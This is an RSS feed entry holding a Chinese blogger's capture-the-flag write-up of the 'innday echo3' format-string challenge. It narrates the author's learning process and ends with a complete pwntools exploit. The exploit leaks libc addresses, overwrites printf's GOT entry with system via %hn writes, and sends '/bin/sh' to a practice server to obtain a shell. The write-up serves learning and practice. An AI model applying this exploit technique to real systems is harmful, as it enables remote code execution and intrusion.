<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>wp - 标签 - yolande 的博客</title>
        <link>https://y01and3.github.io/tags/wp/</link>
        <description>wp - 标签 - yolande 的博客</description>
        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Mon, 21 Mar 2022 23:56:43 &#43;0800</lastBuildDate><atom:link href="https://y01and3.github.io/tags/wp/" rel="self" type="application/rss+xml" /><item>
    <title>innday echo3 wp</title>
    <link>https://y01and3.github.io/pwn_innday_echo3_wp/</link>
    <pubDate>Mon, 21 Mar 2022 23:56:43 &#43;0800</pubDate>
    <author>yolande</author>
    <guid>https://y01and3.github.io/pwn_innday_echo3_wp/</guid>
    <description><![CDATA[<h1 id="innday-echo3-吐槽--记录向-wp">innday echo3 吐槽 &amp; 记录向 wp</h1>
<h2 id="一些碎碎念">一些碎碎念</h2>
<h3 id="不要靠近奶茶会变得不幸">不要靠近奶茶，会变得不幸</h3>
<p>上个月月初 （21.11.03） ， chuj 学长在群里说有一个 fmtstr 题只要写出来就可以得到一杯奶茶。显然，我为了奶茶就冲了。学长发给我题的时候是这样形容这个题的：</p>
<blockquote>
<p>可能会比较有难度</p>
</blockquote>
<p>这是比较有难度吗，这是难，很难！</p>
<h2 id="令人摸不着头脑的过程">令人摸不着头脑的过程</h2>
<h3 id="瞎搞">瞎搞</h3>
<h4 id="一">一</h4>
<p>因为是第一次写 CTF 的题，当然也是第一次写 pwn 题，所以根本不知道该怎么下手，于是就寻求百度的帮助。看了一些 write up 和入门教程之后<strong>大概</strong>明白了要做点什么之后就开始<del>做题</del>瞎搞了。</p>
<p>把elf下载下来之后，先 checksec ，<del><em>不过这一步我做了跟没做一样，虽然百度了，但是根本不理解</em></del>，</p>
<p>然后在 ida 里 F5 了一下，感觉是要修改 magic 的值，然后就开始尝试了。</p>
<p><em>当时还是太天真了，代码都没看明白就开始写了。</em></p>
<p>第一次尝试失败了，对于向来直接莽的我来说根本整不明白发生了什么，于是直接求助学长，得到的结果是方向错了。</p>
<h4 id="二">二</h4>
<p>在几天的摸鱼之后，再次研究这道题，<del>发现我好像上当了</del>，总算是接近正确的路线了。开始<del>在高数课上</del>思考如何获取 system 函数，借鉴网上的入门教程之后认为应该用 shellcode ，就再次询问学长。学长说栈开了不可执行保护，所以不能 shellcode 。</p>
<p>虽然我的方向又错了，但是这次学长给我指了一条明路：泄露 system ，修改 got 表。</p>
<h3 id="仿佛走上正轨">仿佛走上正轨</h3>
<p>为了修改 got 表，要找到一条链。然而第一次尝试的时候运气不太好，并没有发现可以用的链。就再一次步入歧途，思考偏移的问题。然后发现跟偏移好像没什么关系，就又不明白了。一边看各种文章，一边问学长，聊天记录里我懂了又懂。</p>
<p>在某一次尝试之后，我终于发现栈是会变的了！然后又去问学长，<del><em>这么一看我问题好多啊</em></del>，得知了栈是随机的。</p>
<p>开始尝试修改 got 表，但是总是失败。于是再~~第 n ~~次求助，开始学习替换 libc 。按照学长的<a href="https://cjovi.icu/pwnreview/941.html" target="_blank" rel="noopener noreffer">blog</a>
 里的方法替换了libc，但是无论怎么换一直都不能使用。</p>
<p><del>不知道第几次</del>去问学长，学长说</p>
<blockquote>
<p>patchelf 是直接在 elf 里面替换的，所以路径过长的时候可能会覆写一起其他数据，这种情况比较少，但是这里好像确实有这个情况</p>
</blockquote>
<p>解决方案是把 libc 和 ld 放在 elf 的目录下，然后用相对地址替换。</p>
<h3 id="和-exp-纠缠">和 exp 纠缠</h3>
<p>换好 libc 之后，手打就还算顺利了，但是 exp 成为了新的阻碍。</p>
<p>先是要泄露 libc 的基地址。这一个问题还好，并没有困扰我太长时间。</p>
<p>真正要命的是 sendline 中间的间隔太短导致我本地一直卡，就又摸了好几天的鱼，后来改用 sendafter 就解决了这个问题。</p>
<p>最后一个问题是我试图两次写两个完整的 got 然而远程一直失败，问了学长才知道要考虑网络问题，<del>其实也就我会忘记这种事吧</del>。</p>
<p>当时我是重新找的链，用栈上残留的地址写 got 。</p>
<p>后来我发现是有第两个解决方案的，直接改一下本来的 exp ，第一个 got 和第二个一起写，空格的数量直接减半。因为之前测试的时候是有几率可以收到第一个的结束标志的，所以第一个是可以成功写进去的，第二个跟着它应该没有问题，就是这个方案需要碰运气。</p>
<h2 id="exp">EXP</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.23.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">echo</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">26765</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">printf_got</span> <span class="o">=</span> <span class="mh">0x804a014</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload1</span> <span class="o">=</span> <span class="s1">&#39;%47$p %18$p !&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">libc_start_add</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">echo</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">247</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">libc_start_add</span> <span class="o">&lt;</span> <span class="mh">0xf7000000</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">echo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">libc_start_add</span> <span class="o">&gt;</span> <span class="mh">0xf8000000</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">echo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">libc_start_off</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">system_off</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_start_add</span> <span class="o">-</span> <span class="n">libc_start_off</span> <span class="o">+</span> <span class="n">system_off</span>
</span></span><span class="line"><span class="cl">        <span class="n">system_addr_low</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">%</span> <span class="mh">0x10000</span>
</span></span><span class="line"><span class="cl">        <span class="n">system_addr_high</span> <span class="o">=</span> <span class="p">(</span><span class="n">system_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf_got_low</span> <span class="o">=</span> <span class="n">printf_got</span> <span class="o">%</span> <span class="mh">0x10000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">addr_2e</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">echo</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">addr_09_low</span> <span class="o">=</span> <span class="n">addr_2e</span> <span class="o">%</span> <span class="mh">0x10000</span> <span class="o">-</span> <span class="mh">0x94</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">addr_09_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%34$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%8c</span><span class="s1">%35$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">payload3</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">printf_got_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%91$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%2c</span><span class="s1">%89$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!!&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!!&#39;</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">system_addr_low</span> <span class="o">&lt;</span> <span class="n">system_addr_high</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload4</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%9$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_high</span> <span class="o">-</span> <span class="n">system_addr_low</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%11$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!!!&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">payload4</span> <span class="o">=</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_high</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%11$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr_low</span> <span class="o">-</span> <span class="n">system_addr_high</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;c&#39;</span> <span class="o">+</span> <span class="s1">&#39;%9$hn&#39;</span> <span class="o">+</span> <span class="s1">&#39;!!!!&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!!!&#39;</span><span class="p">,</span> <span class="n">payload4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">payload5</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;!!!!&#39;</span><span class="p">,</span> <span class="n">payload5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">echo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="最后的碎碎念">最后的碎碎念</h2>
<p>我写最后一句话的时候已经是 22.3.21 了，这谁想得到呢。其实 21.12.5 的时候好像就写得差不多了，但是一直没有部署 blog ，所以就放着了。虽然写完了，但是我也不知道最后啥时候发。摸鱼去。</p>
]]></description>
</item>
</channel>
</rss>
